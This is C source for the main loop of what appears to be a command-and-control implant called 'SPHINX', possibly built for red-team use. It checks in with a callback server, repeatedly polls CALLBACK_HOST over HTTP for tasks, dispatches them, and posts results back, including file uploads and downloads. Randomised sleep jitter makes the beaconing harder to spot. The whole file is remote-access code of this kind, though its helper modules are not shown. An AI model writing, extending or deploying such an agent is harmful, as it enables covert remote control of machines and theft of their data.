#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include "api_table.h"
#include "comms.h"
#include "config.h"
#include "dispatcher.h"
#include "parser.h"
#include "file_transfer.h"
#include "outbound.h"

// Safety cap: prevents the inner tasking loop from running indefinitely if tasks never clear.
#define MAX_TASKING_ROUNDS 4

volatile uint32_t g_sleep_time = SLEEP_TIME;
volatile uint32_t g_jitter     = JITTER;

int main(void) {
   fprintf(stderr, "[SPHINX] start\n");
   init_api_table();
   fprintf(stderr, "[SPHINX] api_table ok\n");

   // Check-in
   char agent_uuid[37];
   int rc = do_checkin(agent_uuid);
   fprintf(stderr, "[SPHINX] do_checkin rc=%d\n", rc);
   if (rc != 0) {
      Sleep(5000);
      rc = do_checkin(agent_uuid);
      fprintf(stderr, "[SPHINX] do_checkin retry rc=%d\n", rc);
      if (rc != 0) return 1;
   }
   fprintf(stderr, "[SPHINX] checkin OK, uuid=%s\n", agent_uuid);

   // Main beacon loop
   while (1) {
      fprintf(stderr, "[SPHINX] beacon...\n");
      uint8_t get_buf[65536];
      size_t  get_len = 0;

      // GET request: fetch pending tasks
      if (http_get(CALLBACK_HOST, CALLBACK_PORT, CALLBACK_PATH, agent_uuid,
                   get_buf, sizeof(get_buf), &get_len) != 0) {
         fprintf(stderr, "[SPHINX] http_get FAIL\n");
         Sleep(g_sleep_time * 1000);
         continue;
      }
      fprintf(stderr, "[SPHINX] http_get ok len=%llu\n", get_len);

      // Parse tasks from GET response
      Task tasks[MAX_TASKS];
      uint32_t task_count = 0;
      if (parse_tasks(get_buf, get_len, tasks, &task_count) <= 0) {
         task_count = 0;
      }

      uint8_t exit_guard = 0;
      /* Process tasks */
      while (exit_guard < MAX_TASKING_ROUNDS) {
         out_reset();                        // clear outbound buffer
         dispatch(tasks, task_count);        // run all tasks

         if (g_exit_flag) {
            fprintf(stderr, "[SPHINX] exit received, terminating\n");
            return 0;
         }

         // Nothing to send — end of this beacon cycle
         if (!out_have_data() && !file_download_active() && !file_upload_active()) break;

         size_t post_body_len=0;
         uint8_t* post_body = out_take(&post_body_len);

         size_t post_len = 0;
         size_t post_cap = CHUNK_SIZE + 8192;
         uint8_t* post_resp = (uint8_t*)malloc(post_cap);
         if (!post_resp) {
            free(post_body);
            task_count = 0;
            break;
         }

         // POST request: send results, receive new tasks
         http_post(CALLBACK_HOST, CALLBACK_PORT, POST_PATH, agent_uuid,
                   post_body, post_body_len, post_resp, post_cap, &post_len);
         free(post_body);

         if (parse_tasks(post_resp, post_len, tasks, &task_count) <= 0 || task_count == 0) {
            free(post_resp);
            break;   // no more work this beacon cycle
         }
         fprintf(stderr, "[SPHINX] post returned %u tasks\n", task_count);

         free(post_resp);
         exit_guard++;
      }

      // Sleep with jitter
      DWORD delay = g_sleep_time * 1000;
      if (g_jitter > 0) {
         delay = delay - (g_jitter * 10) + (rand() % (g_jitter * 20));
      }
      Sleep(delay);
   }
}
